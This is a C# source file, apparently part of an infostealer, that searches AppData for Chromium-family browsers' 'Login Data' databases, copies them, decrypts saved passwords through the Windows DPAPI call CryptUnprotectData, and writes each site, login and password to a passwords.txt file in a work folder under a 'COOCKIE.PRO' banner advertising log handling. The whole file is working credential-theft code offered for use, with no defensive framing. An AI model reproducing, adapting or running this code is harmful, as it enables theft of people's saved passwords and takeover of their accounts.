using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using who.GeckoBrowsers;
using who.Helper;

namespace who.Func
{
    class Passwords
        {

        public static string result;
        public static int PassCounts = 0;
        public static List<PassData> list = new List<PassData>();
        public static void GetPasswordsNEW()
        {
            string[] BrowsersName = new string[]
            {
                "Chrome", "Yandex", "Orbitum", "Opera",
                 "Amigo", "Torch", "Comodo", "CentBrowser",
                  "Go!", "uCozMedia", "Rockmelt", "Sleipnir",
                   "SRWare Iron", "Vivaldi", "Sputnik", "Maxthon",
                    "AcWebBrowser", "Epic Browser", "MapleStudio", "BlackHawk",
                    "Flock", "CoolNovo", "Baidu Spark", "Titan Browser"
            };

            try
            {
                Directory.CreateDirectory(Dirs.WorkDir + "\\Browsers");
                
                List<string> Browsers = new List<string>();
                List<string> BrPaths = new List<string>
            {
            Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData)
            };
                var APD = new List<string>();
               
                foreach (var paths in BrPaths)
                {
                    try
                    {
                        APD.AddRange(Directory.GetDirectories(paths));
                    }
                    catch { }
                }
                foreach (var e in APD)
                {
                    try
                    {
                        Browsers.AddRange(Directory.GetFiles(e, "Login Data", SearchOption.AllDirectories));

                        string[] files = Directory.GetFiles(e, "Login Data", SearchOption.AllDirectories);
                        foreach (string file in files)
                        {
                            try
                            {
                                if (File.Exists(file))
                                {
                                    string str = $"Unknown ({file})";

                                    foreach (string name in BrowsersName)
                                    {
                                        if (file.Contains(name))
                                        {
                                            str = name;
                                        }
                                    }


                                    try
                                    {
                                        string path = Path.GetTempPath() + "/test.fv";
                                        if (File.Exists(path))
                                        {
                                            File.Delete(path);
                                        }
                                        File.Copy(file, path, true);
                                        SqlHandler handler = new SqlHandler(path);
                                        if (handler.ReadTable("logins") == false)
                                            break;
                                        int rowNum = 0;


                                        while (true)
                                        {
                                            try
                                            {
                                                if (rowNum >= handler.GetRowCount())
                                                {
                                                    break;
                                                }
                                                try
                                                {
                                                    string str3 = string.Empty;
                                                    try
                                                    {
                                                        str3 = Encoding.UTF8.GetString(DecryptBrowsers(Encoding.Default.GetBytes(handler.GetValue(rowNum, 5)), null));
                                                    }
                                                    catch (Exception)
                                                    {
                                                    }
                                                    if (str3 != "")
                                                    {                                                       

                                                        PassData item = new PassData
                                                        {
                                                            Url = handler.GetValue(rowNum, 1).Replace("https://", "").Replace("http://", "").Replace("www.", ""),
                                                            Login = handler.GetValue(rowNum, 3),
                                                            Password = str3,
                                                            Program = str
                                                        };
                                                        result += Convert.ToString(Environment.NewLine + item);
                                                        PassCounts++;
                                                    }
                                                }
                                                catch 
                                                {
                                                }
                                                rowNum++;
                                            }
                                            catch { }
                                        }
                                        File.Delete(path);

                                    }
                                    catch { }
                                }
                                                          
                            }
                            catch 
                            {
                            }
                        }

                        
                    }
                    catch { }
                }

                File.WriteAllText(Dirs.WorkDir + "\\passwords.txt", (result != null) ? $"COOCKIE.PRO - Professionals in working with logs! {Environment.NewLine + result}\n"  : "", Encoding.Default);
            }
            catch { }

        }


        
        public static byte[] DecryptBrowsers(byte[] cipherTextBytes, byte[] entropyBytes = null)
            {
                DataBlob pPlainText = new DataBlob();
                DataBlob pCipherText = new DataBlob();
                DataBlob pEntropy = new DataBlob();
                CryptprotectPromptstruct pPrompt = new CryptprotectPromptstruct()
                {
                    cbSize = Marshal.SizeOf(typeof(CryptprotectPromptstruct)),
                    dwPromptFlags = 0,
                    hwndApp = IntPtr.Zero,
                    szPrompt = null
                };
                string empty = string.Empty;
                try
                {
                    try
                    {
                        if (cipherTextBytes == null)
                            cipherTextBytes = new byte[0];
                        pCipherText.pbData = Marshal.AllocHGlobal(cipherTextBytes.Length);
                        pCipherText.cbData = cipherTextBytes.Length;
                        Marshal.Copy(cipherTextBytes, 0, pCipherText.pbData, cipherTextBytes.Length);
                    }
                    catch 
                    {
                    }
                    try
                    {
                        if (entropyBytes == null)
                            entropyBytes = new byte[0];
                        pEntropy.pbData = Marshal.AllocHGlobal(entropyBytes.Length);
                        pEntropy.cbData = entropyBytes.Length;
                        Marshal.Copy(entropyBytes, 0, pEntropy.pbData, entropyBytes.Length);
                    }
                    catch 
                    {
                    }
                    CryptUnprotectData(ref pCipherText, ref empty, ref pEntropy, IntPtr.Zero, ref pPrompt, 1, ref pPlainText);
                    byte[] destination = new byte[pPlainText.cbData];
                    Marshal.Copy(pPlainText.pbData, destination, 0, pPlainText.cbData);
                    return destination;
                }
                catch 
                {
                }
                finally
                {
                    if (pPlainText.pbData != IntPtr.Zero)
                        Marshal.FreeHGlobal(pPlainText.pbData);
                    if (pCipherText.pbData != IntPtr.Zero)
                        Marshal.FreeHGlobal(pCipherText.pbData);
                    if (pEntropy.pbData != IntPtr.Zero)
                        Marshal.FreeHGlobal(pEntropy.pbData);
                }
                return new byte[0];
            }

            [DllImport("crypt32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern bool CryptUnprotectData(ref DataBlob pCipherText, ref string pszDescription, ref DataBlob pEntropy, IntPtr pReserved, ref CryptprotectPromptstruct pPrompt, int dwFlags, ref DataBlob pPlainText);

            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            private struct DataBlob
            {
                public int cbData;
                public IntPtr pbData;
            }

            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
            private struct CryptprotectPromptstruct
            {
                public int cbSize;
                public int dwPromptFlags;
                public IntPtr hwndApp;
                public string szPrompt;
            }


        }

    class PassData
    {

        public string Url { get; set; }

        public string Login { get; set; }

        public string Password { get; set; }

        public string Program { get; set; }

        public override string ToString()
        {          
            return string.Format("Host: {0}\r\nLogin: {1}\r\nPassword: {2}\r\nSoft: {3}\r\n \r\n", Url, Login, Password, Program);
        }
    }
}

